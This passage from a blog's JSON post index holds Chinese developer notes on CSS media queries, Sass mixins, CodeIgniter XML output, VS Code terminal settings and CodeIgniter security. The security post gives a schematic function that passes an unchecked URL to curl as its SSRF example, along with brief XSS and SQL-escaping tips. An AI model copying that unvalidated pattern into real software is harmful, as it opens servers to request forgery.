方法<br>再仔細查了一下，還有別種寫法<br>有看到一些自己不會這樣寫的<br>特別筆記一下</p>\n<a id=\"more\"></a>\n<h2 id=\"一般常見寫法\"><a href=\"#一般常見寫法\" class=\"headerlink\" title=\"一般常見寫法\"></a>一般常見寫法</h2><p>一般常見這種寫法<br><code>@media screen and (min-width: 400px) and (max-width: 700px)</code></p>\n<p>這種寫法順序會比較安全</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">media</span> screen and (min-width: <span class=\"number\">400px</span>) and (max-width: <span class=\"number\">700px</span>) &#123;</span><br><span class=\"line\">  <span class=\"selector-class\">.header</span> &#123;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"特別寫法\"><a href=\"#特別寫法\" class=\"headerlink\" title=\"特別寫法\"></a>特別寫法</h2><p>在<a href=\"https://blog.hellosanta.com.tw/%E7%B6%B2%E7%AB%99%E8%A8%AD%E8%A8%88/%E5%89%8D%E7%AB%AF/%E4%BD%BF%E7%94%A8sass-mixin%E4%BE%86%E9%96%8B%E7%99%BCresponsive%E7%B6%B2%E7%AB%99\" target=\"_blank\" rel=\"noopener\">使用 sass mixin 來開發 responsive 網站 | Hello Santa web design,drupal and more</a>裡面有看到這種寫法</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.div</span>&#123;</span><br><span class=\"line\">         //desktop</span><br><span class=\"line\">         @<span class=\"keyword\">media</span> all and (min-width: <span class=\"number\">960px</span>) &#123;</span><br><span class=\"line\">                <span class=\"selector-tag\">padding</span><span class=\"selector-pseudo\">:20px</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">         //pad</span><br><span class=\"line\">         @<span class=\"keyword\">media</span> all and (min-width: <span class=\"number\">760px</span>) and (max-width: <span class=\"number\">959px</span>) &#123;</span><br><span class=\"line\">              <span class=\"selector-tag\">padding</span><span class=\"selector-pseudo\">:10px</span>;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">         //mini pad</span><br><span class=\"line\">         @<span class=\"keyword\">media</span> all and (min-width: <span class=\"number\">480px</span>) and (max-width: <span class=\"number\">759px</span>) &#123;</span><br><span class=\"line\">               <span class=\"selector-tag\">padding</span><span class=\"selector-pseudo\">:5px</span>;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">         //mobile</span><br><span class=\"line\">         @<span class=\"keyword\">media</span> all and (max-width: <span class=\"number\">480px</span>) &#123;</span><br><span class=\"line\">               <span class=\"selector-tag\">padding</span><span class=\"selector-pseudo\">:0px</span>;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>沒想到 media 可以放在裡面<br>這樣寫也比較不會亂</p>\n<h2 id=\"簡單寫法-需要小心順序\"><a href=\"#簡單寫法-需要小心順序\" class=\"headerlink\" title=\"簡單寫法(需要小心順序)\"></a>簡單寫法(需要小心順序)</h2><figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.header</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">padding</span>: <span class=\"number\">20px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//pad</span><br><span class=\"line\">@<span class=\"keyword\">media</span> (max-width: <span class=\"number\">959px</span>) &#123;</span><br><span class=\"line\">  <span class=\"selector-class\">.header</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//mini pad</span><br><span class=\"line\">@<span class=\"keyword\">media</span> (max-width: <span class=\"number\">759px</span>) &#123;</span><br><span class=\"line\">  <span class=\"selector-class\">.header</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">5px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//mobile</span><br><span class=\"line\">@<span class=\"keyword\">media</span> (max-width: <span class=\"number\">480px</span>) &#123;</span><br><span class=\"line\">  <span class=\"selector-class\">.header</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">0px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>建議是只寫 max-width 的話由大像素寫到小像素，min-width 按小像素到大像素的順序，從上往下寫，不然會達不到控制的樣式目的。</p>\n</blockquote>\n<p>這種寫法可能需要注意順序，可參考<a href=\"https://blog.csdn.net/cmlddcml/article/details/48973589\" target=\"_blank\" rel=\"noopener\">@media screen 的書寫順序 - WEB 前端娃——steiny - CSDN 博客</a></p>\n<h2 id=\"SASS-寫法\"><a href=\"#SASS-寫法\" class=\"headerlink\" title=\"SASS 寫法\"></a>SASS 寫法</h2><p>用 mixin 方法，但這邊使用上面簡單方法設定</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">// device</span><br><span class=\"line\">$mobile: 568px;</span><br><span class=\"line\">$pad: 768px;</span><br><span class=\"line\">$desktop: 960px;</span><br><span class=\"line\"></span><br><span class=\"line\">// color</span><br><span class=\"line\">$red: #ff0000;</span><br><span class=\"line\">$black: #000;</span><br><span class=\"line\"></span><br><span class=\"line\">@mixin mobile &#123;</span><br><span class=\"line\">    @media (max-width: $mobile) &#123;</span><br><span class=\"line\">        @content;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@mixin pad &#123;</span><br><span class=\"line\">    @media (max-width: $pad) &#123;</span><br><span class=\"line\">        @content;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@mixin desktop &#123;</span><br><span class=\"line\">    @media (max-width: $desktop) &#123;</span><br><span class=\"line\">        @content;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">.header&#123;</span><br><span class=\"line\">    color: $black;</span><br><span class=\"line\">    @include pad&#123;</span><br><span class=\"line\">        color: $red;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @include mobile&#123;</span><br><span class=\"line\">        display: none;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"深入了解\"><a href=\"#深入了解\" class=\"headerlink\" title=\"深入了解\"></a>深入了解</h2><h3 id=\"media-max-width-和-min-width-順序問題\"><a href=\"#media-max-width-和-min-width-順序問題\" class=\"headerlink\" title=\"@media max-width 和 min-width 順序問題\"></a>@media max-width 和 min-width 順序問題</h3><p>深入了解<a href=\"https://blog.csdn.net/cmlddcml/article/details/48973589\" target=\"_blank\" rel=\"noopener\">@media screen 的書寫順序 - WEB 前端娃——steiny - CSDN 博客</a></p>\n<p>@media (max-width: 959px) //裝置小於 959 會進來<br>@media (max-width: 759px) //裝置小於 759 會進來<br>@media (max-width: 480px) //裝置小於 480 會進來</p>\n<p>但是寫反會遇到什麼事情</p>\n<p>裝置 300 因為 CSS 順序關係，所以會吃到 959 的設定<br>@media (max-width: 480px) //裝置小於 480 會進來<br>@media (max-width: 759px) //裝置小於 759 會進來<br>@media (max-width: 959px) //裝置小於 959 會進來</p>\n<p><a href=\"https://blog.csdn.net/cmlddcml/article/details/48973589\" target=\"_blank\" rel=\"noopener\">@media screen 的書寫順序 - WEB 前端娃——steiny - CSDN 博客</a><br>簡單口決真的記得</p>\n<blockquote>\n<p>建議是只寫 max-width 的話由大像素寫到小像素，min-width 按小像素到大像素的順序，從上往下寫，不然會達不到控制的樣式目的。</p>\n</blockquote>\n<h3 id=\"media-的-screen-可以省略\"><a href=\"#media-的-screen-可以省略\" class=\"headerlink\" title=\"@media 的 screen 可以省略\"></a>@media 的 screen 可以省略</h3><p>為什麼我看有些 code 裡面的@media 可以省略?<br>翻了<a href=\"https://developer.mozilla.org/zh-TW/docs/Web/CSS/@media#media-type\" target=\"_blank\" rel=\"noopener\">@media - CSS | MDN</a>沒有寫<br>不過找到<a href=\"https://ithelp.ithome.com.tw/articles/10194937\" target=\"_blank\" rel=\"noopener\">前端新手村 Media Query - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a><br>裡面有提</p>\n<blockquote>\n<p>media type 是 all 時，可以省略。</p>\n</blockquote>\n<p>不過我之前專案有用到@media print 功能<br>只要用 CSS 就能調整列印樣式<br>真的是很方便</p>\n<p><a href=\"https://cdc.tencent.com/2014/08/19/print-%E8%A2%AB%E5%9F%8B%E6%B2%A1%E7%9A%84media-type/\" target=\"_blank\" rel=\"noopener\">Print —— 被埋没的 Media Type – 腾讯 CDC</a></p>\n<h3 id=\"有關於-compass\"><a href=\"#有關於-compass\" class=\"headerlink\" title=\"有關於 compass\"></a>有關於 compass</h3><p>當出學 SASS 的時候，有看到 compass<br>但最近感覺很少人提到 compass<br>所以我有查了一下<br>原來 compass 已經很久沒更新了</p>\n<p>Compass 有哪些好處呢?裡面<a href=\"https://www.hannahpun.me/compass/\" target=\"_blank\" rel=\"noopener\">[scss]Compass | hannahpun</a>裡面 2 個我覺得不錯</p>\n<blockquote>\n<ol>\n<li>Sprite</li>\n<li>Helper 函數( image-width,image-height 太神!!!)</li>\n</ol>\n</blockquote>\n<p>取代 compass 我查到用 gulp 或 webpack 做 sprite、CSS3 各瀏覽器的 CSS 可以通過 postcss 解決</p>\n<ul>\n<li><a href=\"https://wcc723.github.io/sass/2015/12/20/replace-compass-with-node-sass/?utm_source=tuicool&amp;utm_medium=referral\" target=\"_blank\" rel=\"noopener\">Compass 替代方案(1) - 更快速的 Sass | 卡斯伯 Blog - 前端，沒有極限</a></li>\n<li><a href=\"https://wcc723.github.io/sass/2015/12/25/replace-compass-with-node-sass-2/\" target=\"_blank\" rel=\"noopener\">Compass 替代方案(2) - 透過 PostCSS，停止加入不必要的 prefix | 卡斯伯 Blog - 前端，沒有極限</a></li>\n<li><a href=\"https://wcc723.github.io/sass/2016/01/03/replace-compass-with-node-sass-3/\" target=\"_blank\" rel=\"noopener\">Compass 替代方案(3) - 加入 SVG Sprites | 卡斯伯 Blog - 前端，沒有極限</a></li>\n</ul>\n<p>上面有機會用的話，再來詳細筆記</p>\n<p>PS: 當然 image-width,image-height 目前沒有解決方案</p>\n<p>參考來源：</p>\n<ul>\n<li><a href=\"https://hsinyu00.wordpress.com/2011/04/05/mobile-web-media-queries/\" target=\"_blank\" rel=\"noopener\">Mobile Web 前端技術筆記(二): Media Queries 與 CSS – 烏托比亞</a></li>\n<li><a href=\"https://blog.csdn.net/cmlddcml/article/details/48973589\" target=\"_blank\" rel=\"noopener\">@media screen 的书写顺序 - WEB 前端娃——steiny - CSDN 博客</a></li>\n<li><a href=\"https://blog.hellosanta.com.tw/%E7%B6%B2%E7%AB%99%E8%A8%AD%E8%A8%88/%E5%89%8D%E7%AB%AF/%E4%BD%BF%E7%94%A8sass-mixin%E4%BE%86%E9%96%8B%E7%99%BCresponsive%E7%B6%B2%E7%AB%99\" target=\"_blank\" rel=\"noopener\">使用 sass mixin 來開發 responsive 網站 | Hello Santa web design,drupal and more</a></li>\n<li><a href=\"https://www.oxxostudio.tw/articles/201810/css-media-queries.html\" target=\"_blank\" rel=\"noopener\">CSS Media Queries 詳細介紹 - OXXO.STUDIO</a></li>\n<li><a href=\"https://www.hannahpun.me/compass/\" target=\"_blank\" rel=\"noopener\">[scss]Compass | hannahpun</a></li>\n<li><a href=\"https://wcc723.github.io/sass/2015/12/20/replace-compass-with-node-sass/?utm_source=tuicool&amp;utm_medium=referral\" target=\"_blank\" rel=\"noopener\">Compass 替代方案(1) - 更快速的 Sass | 卡斯伯 Blog - 前端，沒有極限</a></li>\n<li><a href=\"http://steventtud.logdown.com/posts/2015/06/01/279546\" target=\"_blank\" rel=\"noopener\">Sass 的@import @mixin @content @extend 與@function « StevenTTuD’s notes</a></li>\n<li><a href=\"https://ithelp.ithome.com.tw/articles/10156850\" target=\"_blank\" rel=\"noopener\">Sass 教學 (11) - @content - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n</ul>\n","categories":["CSS"],"tags":["css","RWD","media"]},{"title":"CodeIgniter 輸出XML 筆記","url":"/blog/2018/10/07/CodeIgniter-%E8%BC%B8%E5%87%BAXML-%E7%AD%86%E8%A8%98/","content":"<p>最近收到要實作要回傳 XML 的 API<br>不過，真得已經習慣用 PHP 做 JSON 格式<br>只需要用 json_encode 就可以搞定</p>\n<a id=\"more\"></a>\n<p>PHP 本身函式就有對 XML 做解析<br>不過組 XML 好像沒有比較好方式</p>\n<p>有查到<a href=\"https://stackoverflow.com/questions/10361074/xml-creation-using-codeigniter\" target=\"_blank\" rel=\"noopener\">php - XML creation using CodeIgniter - Stack Overflow</a></p>\n<p><a href=\"https://codeigniter.com/user_guide/database/utilities.html?highlight=xml_from_result#CI_DB_utility::xml_from_result\" target=\"_blank\" rel=\"noopener\">Database Utility Class — CodeIgniter 3.1.9 documentation</a></p>\n<p>但這次 DB 剛好存的資料不是剛好要組出來的資料<br>最終有網路看到原生支援的方法<br>加上補<code>&lt;![CDATA[ ]]!&gt;</code><br>這一段是防止<code>&gt;</code>符號產生錯誤<br>也不用改寫成<code>&amp;lt;</code></p>\n<p><a href=\"http://www.w3school.com.cn/xml/xml_cdata.asp\" target=\"_blank\" rel=\"noopener\">XML CDATA</a></p>\n<p>SimpleXMLElement 加上 CDATA 方法</p>\n<p><a href=\"https://fukun.org/archives/04192195.html\" target=\"_blank\" rel=\"noopener\">php 使用 simpleXML 添加 CDATA 格式数据</a></p>\n<p><a href=\"https://codeday.me/bug/20170905/67209.html\" target=\"_blank\" rel=\"noopener\">php – 如何使用 SimpleXmlElement 编写 CDATA？ - 代码日志</a></p>\n<p><a href=\"http://php.net/manual/en/domdocument.createcdatasection.php\" target=\"_blank\" rel=\"noopener\">PHP: DOMDocument::createCDATASection - Manual</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">* to show &lt;title lang=\"en\"&gt;&lt;![CDATA[Site Title]]&gt;&lt;/title&gt;   instead of &lt;title lang=\"en\"&gt;Site Title&lt;/title&gt;</span></span><br><span class=\"line\"><span class=\"comment\">*</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SimpleXMLExtended</span> <span class=\"keyword\">extends</span> <span class=\"title\">SimpleXMLElement</span></span></span><br><span class=\"line\"><span class=\"class\">  </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addCData</span><span class=\"params\">($cdata_text)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">    $node = dom_import_simplexml(<span class=\"keyword\">$this</span>);</span><br><span class=\"line\">    $no   = $node-&gt;ownerDocument;</span><br><span class=\"line\">    $node-&gt;appendChild($no-&gt;createCDATASection($cdata_text));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">$xmlFile    = <span class=\"string\">'config.xml'</span>;</span><br><span class=\"line\"><span class=\"comment\">// instead of $xml = new SimpleXMLElement('&lt;sites/&gt;');</span></span><br><span class=\"line\">$xml = <span class=\"keyword\">new</span> SimpleXMLExtended(<span class=\"string\">'&lt;sites/&gt;'</span>);</span><br><span class=\"line\">$site = $xml-&gt;addChild(<span class=\"string\">'site'</span>);</span><br><span class=\"line\"><span class=\"comment\">// instead of $site-&gt;addChild('site', 'Site Title');</span></span><br><span class=\"line\">$site-&gt;title = <span class=\"keyword\">NULL</span>; <span class=\"comment\">// VERY IMPORTANT! We need a node where to append</span></span><br><span class=\"line\">$site-&gt;title-&gt;addCData(<span class=\"string\">'Site Title'</span>);</span><br><span class=\"line\">$site-&gt;title-&gt;addAttribute(<span class=\"string\">'lang'</span>, <span class=\"string\">'en'</span>);</span><br><span class=\"line\">$xml-&gt;asXML($xmlFile);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>然後用 PHP 內建多行字串，需要注意用 NOWODC<br>使用 HEREDOC，裡面有<code>$</code>會抓取 PHP 變數<br>所以需要用 NOWDOC</p>\n<p>出輸內容</p>\n<p><a href=\"https://codeigniter.org.tw/userguide3/libraries/output.html#CI_Output::set_content_type\" target=\"_blank\" rel=\"noopener\">Output Class — CodeIgniter 3.1.5 documentation</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">$this</span>-&gt;output</span><br><span class=\"line\">        -&gt;set_content_type(<span class=\"string\">'application/json'</span>)</span><br><span class=\"line\">        -&gt;set_output(json_encode(<span class=\"keyword\">array</span>(<span class=\"string\">'foo'</span> =&gt; <span class=\"string\">'bar'</span>)));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">$this</span>-&gt;output</span><br><span class=\"line\">        -&gt;set_content_type(<span class=\"string\">'jpeg'</span>) <span class=\"comment\">// You could also use \".jpeg\" which will have the full stop removed before looking in config/mimes.php</span></span><br><span class=\"line\">        -&gt;set_output(file_get_contents(<span class=\"string\">'files/something.jpg'</span>));</span><br></pre></td></tr></table></figure>\n<p>結果</p>\n<p>研究完，收到要改寫回傳 JSON 的 api<br>不過 json 會更簡單<br><code>json(xxxx,true)</code><br>跟</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$json = [</span><br><span class=\"line\">    &quot;test&quot;=&gt;[</span><br><span class=\"line\">        &quot;number=&gt;[0,1,2,3,4,5]</span><br><span class=\"line\">    ]</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>寫法有空整理再發文</p>\n<p>2019-01-02 補充 Array to XML 的 Library<br><a href=\"https://github.com/Jeckerson/array2xml\" target=\"_blank\" rel=\"noopener\">GitHub - Jeckerson/array2xml: [PHP] - Array to XML</a></p>\n<p><a href=\"https://github.com/spatie/array-to-xml\" target=\"_blank\" rel=\"noopener\">GitHub - spatie/array-to-xml: A simple class to convert an array to xml</a></p>\n<p>2019-03-12 用原生方法沒辦法載入<br>[xml - How to get values inside &lt;<img src=\"https://stackoverflow.com/questions/6674322/how-to-get-values-inside-cdatavalues-using-php-dom\" alt=\"CDATA[values]] &gt; using php DOM? - Stack Overflow\"><br>[xml - PHP: How to handle &lt;![CDATA<a href=\"https://stackoverflow.com/questions/2970602/php-how-to-handle-cdata-with-simplexmlelement\" target=\"_blank\" rel=\"noopener\"> with SimpleXMLElement? - Stack Overflow</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$content = simplexml_load_string(</span><br><span class=\"line\">    <span class=\"string\">'&lt;content&gt;&lt;![CDATA[Hello, world!]]&gt;&lt;/content&gt;'</span></span><br><span class=\"line\">    , <span class=\"keyword\">null</span></span><br><span class=\"line\">    , LIBXML_NOCDATA</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/110823/\" target=\"_blank\" rel=\"noopener\">PHP 操作 XML | 程式前沿</a></p>\n","categories":["PHP"],"tags":["xml","codeigenter"]},{"title":"Codeigniter 安全性小記","url":"/blog/2019/06/01/Codeigniter-%E5%AE%89%E5%85%A8%E6%80%A7%E5%B0%8F%E8%A8%98/","content":"<p>最近專案由於有 QA 團隊檢查安全性<br>所以這邊紀錄一下最近專案用 Codeigniter<br>上一篇有紀錄到一些安全性 <a href=\"https://malagege.github.io/blog/2019/05/26/CSRF-SSRF-XSS%E6%9C%89%E9%97%9C%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E5%B0%8F%E8%A8%98/\">CSRF , SSRF , XSS 有關網頁安全小記 | 程式狂想筆記</a></p>\n<a id=\"more\"></a>\n<h2 id=\"SQL-需要注意安全性問題\"><a href=\"#SQL-需要注意安全性問題\" class=\"headerlink\" title=\"SQL 需要注意安全性問題\"></a>SQL 需要注意安全性問題</h2><p>首先，講一下 SQL INJECTION<br>假如要放 SQL 進去查詢，但是複雜的功能平常不可能用 bind 用 <code>?</code> 去套<br>所以再用 變數串 SQL 的時候可能就會有危險的問題，但是不能用 bind</p>\n<p>這時候需要加 <code>escape</code> 或 <code>escape_str</code><br>原始碼可以參考這個<a href=\"https://github.com/bcit-ci/CodeIgniter/blob/7ec458b45316b9f270e1e03de498244f71c605ea/system/database/DB_driver.php#L1037\" target=\"_blank\" rel=\"noopener\">CodeIgniter/DB_driver.php at 7ec458b45316b9f270e1e03de498244f71c605ea · bcit-ci/CodeIgniter</a><br><code>$str = array_map(array(&amp;$this, &#39;escape&#39;), $str);</code><br>PHP 的 array function 的運用真的 千變萬化</p>\n<p><strong>首先講一下 escape 的小雷</strong><br>看了一下 Code<br>想說這兩個功能都一樣<br>不過<code>escape</code>接到 string 型態<br>外面會自動加<code>&#39;</code>單引號<br>雖然不知道為什麼<br>所以為什麼<code>limit ?</code>不能用 bind<br>原因可能是 escape 會有問題(會變成 limit ‘2’)<br>所以在用的時候需要小心</p>\n<h2 id=\"XSS-小心\"><a href=\"#XSS-小心\" class=\"headerlink\" title=\"XSS 小心\"></a>XSS 小心</h2><p>常常在網路上看到，通常都是用 JS 攻擊<br>所以需要做 XSS 過濾<br>當然輸入要過濾&lt;<code>script</code>&gt;<br>輸出的是要做<code>htmlspecialchar</code><br>Codeigniter 沒有現代化框架好用東西，如<code></code><br>但是還是有好用的工具，如 html_escape<br>相關程式原碼 <a href=\"https://github.com/bcit-ci/CodeIgniter/blob/07cb9fd45f94d928c0f6dcf73f702808e1e03f62/system/core/Common.php#L748\" target=\"_blank\" rel=\"noopener\">CodeIgniter/Common.php at 07cb9fd45f94d928c0f6dcf73f702808e1e03f62 · bcit-ci/CodeIgniter</a><br>使用上除了可以塞 string 外 他還可以塞 array<br>會把所有內容做過濾</p>\n<p><code>xss_clean()</code><br>可以過濾<code>&lt;script&gt;</code><br>但是注意！！這個不是在過濾 HTML tag(ex: &lt;<code>img</code>&gt;,&lt;<code>a</code>&gt;)</p>\n<p><code>$data = $this-&gt;security-&gt;xss_clean($data);</code></p>\n<p>當然 img 也會有這個問題<br>如這篇 <a href=\"https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md\" target=\"_blank\" rel=\"noopener\">CheatSheetSeries/Cross_Site_Scripting_Prevention_Cheat_Sheet.md at master · OWASP/CheatSheetSeries</a></p>\n<h3 id=\"圖片也要注意-XSS-攻擊\"><a href=\"#圖片也要注意-XSS-攻擊\" class=\"headerlink\" title=\"圖片也要注意 XSS 攻擊\"></a>圖片也要注意 XSS 攻擊</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;security-&gt;xss_clean($file, <span class=\"keyword\">TRUE</span>) === <span class=\"keyword\">FALSE</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"comment\">// file failed the XSS test</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">$this</span>-&gt;input-&gt;get(xxx , <span class=\"keyword\">TRUE</span> );</span><br></pre></td></tr></table></figure>\n<h2 id=\"SSRF-安全過濾\"><a href=\"#SSRF-安全過濾\" class=\"headerlink\" title=\"SSRF 安全過濾\"></a>SSRF 安全過濾</h2><p>在寫 call curl API 需要安全行確認<br>是不是參數是安全的<br>例如</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">callAPI</span><span class=\"params\">($url)</span></span>&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    curl($url)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面 code 不能跑<br>這就會有 SSRF 問題<br>聽說 Server 端也能處理這個問題</p>\n<p><a href=\"https://justcoding.iteye.com/blog/546880\" target=\"_blank\" rel=\"noopener\">CodeIgniter 的数据安全过滤全解析 - Just Code - ITeye 博客</a><br><a href=\"https://blog.wu-boy.com/2011/08/%E6%B7%B1%E5%85%A5%E6%8E%A2%E8%A8%8E-codeigniter-input-class-%E6%A0%B8%E5%BF%83%E7%A8%8B%E5%BC%8F%E6%B5%81%E7%A8%8B/\" target=\"_blank\" rel=\"noopener\">深入探討 CodeIgniter Input Class 核心程式流程 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY</a></p>\n","categories":["Codeigniter"],"tags":["codeigniter","php"]},{"title":"Code命令提示字元設定為zsh","url":"/blog/2018/04/08/Code%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E5%AD%97%E5%85%83%E8%A8%AD%E5%AE%9A%E7%82%BAzsh/","content":"<p>這篇記錄我在code設定command line設定<br><a id=\"more\"></a></p>\n<h1 id=\"Visual-Studio-Code設定\"><a href=\"#Visual-Studio-Code設定\" class=\"headerlink\" title=\"Visual Studio Code設定\"></a>Visual Studio Code設定</h1><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">\"terminal.integrated.shell.windows\"</span>: <span class=\"string\">\"C:\\\\Users\\\\Administrator\\\\.babun\\\\cygwin\\\\bin\\\\zsh.exe\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"terminal.integrated.fontFamily\"</span>: <span class=\"string\">\"Hack\"</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但是後來決定放棄使用這個<br><img src=\"/blog/2018/04/08/Code命令提示字元設定為zsh/vs_zsh.gif\" title=\"code在zsh文字游標怪怪的\"></p>\n<p>打算使用cmder…，不過在<a href=\"https://mousyball.github.io/2018/02/12/my-vscode-setting/#Integrated-Terminal\" target=\"_blank\" rel=\"noopener\">VSCode 使用設定 | Mo1cibo’s Blog</a><br>有看到好像也是跟我一樣的問題</p>\n<p>後來決定使用cmder，不過發現<code>cmder.exe</code>快捷鍵<code>ctrl+‵</code>可以彈出，再按一次<code>ctrl+‵</code><br>可以再縮小</p>\n<img src=\"/blog/2018/04/08/Code命令提示字元設定為zsh/cmder_ctrl_.gif\" title=\"code在zsh文字游標怪怪的\">\n<p>感覺也沒必要再設定…..</p>\n<p>不過還是紀錄爬文設定<br><figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">// Command Prompt</span><br><span class=\"line\">\"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"</span><br><span class=\"line\">// PowerShell</span><br><span class=\"line\">\"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"</span><br><span class=\"line\">// Git Bash</span><br><span class=\"line\">\"terminal.integrated.shell.windows\": \"C:\\\\Program Files\\\\Git\\\\bin\\\\bash.exe\"</span><br><span class=\"line\">// Bash on Ubuntu (on Windows)</span><br><span class=\"line\">\"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\bash.exe\"</span><br><span class=\"line\"></span><br><span class=\"line\">// zsh</span><br><span class=\"line\">\"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\bash.exe\",</span><br><span class=\"line\">\"terminal.integrated.shellArgs.windows\": [</span><br><span class=\"line\">    \"-c\",</span><br><span class=\"line\">    <span class=\"string\">\"zsh\"</span></span><br><span class=\"line\">],</span><br><span class=\"line\"></span><br><span class=\"line\">// cmder</span><br><span class=\"line\">\"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\",</span><br><span class=\"line\">\"terminal.integrated.shellArgs.windows\": [</span><br><span class=\"line\">    \"/K\",</span><br><span class=\"line\">    <span class=\"string\">\"C:\\\\cmder\\\\vscode.bat\"</span></span><br><span class=\"line\">],</span><br><span class=\"line\"></span><br><span class=\"line\">// font &amp; fontSize</span><br><span class=\"line\">\"terminal.integrated.fontFamily\": \"DejaVu Sans Mono for powerline\",</span><br><span class=\"line\">\"terminal.integrated.fontSize\": 15,</span><br></pre></td></tr></table></figure></p>\n<p>發現window可以用Ubuntu來啟動zsh<br>我是用同事介紹的babun<br>不過window感覺用cmder還滿順<br>應該會先使用這個為優先</p>\n<p>參考來源:<br><a href=\"https://mousyball.github.io/2018/02/12/my-vscode-setting/#Integrated-Terminal\" target=\"_blank\" rel=\"noopener\">VSCode 使用設定 | Mo1cibo’s Blog</a></p>\n","categories":["實用工具"],"tags":["zsh","visual studio code"]},{"title":"Code自訂snippet","url":"/blog/2018/04/08/Code%E8%87%AA%E8%A8%82snippet/","content":"<p>最近寫blog很長手動打<code>&lt;!--more--&gt;</code><br>想說snippet來增加寫文章速度<br>也不用在找<code>asset_img</code><br>語法我真的記不太住….</p>\n<a id=\"more\"></a>\n<p>目前我為Hexo設定的snippets<br><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"attr\">\"Read More\"</span>: 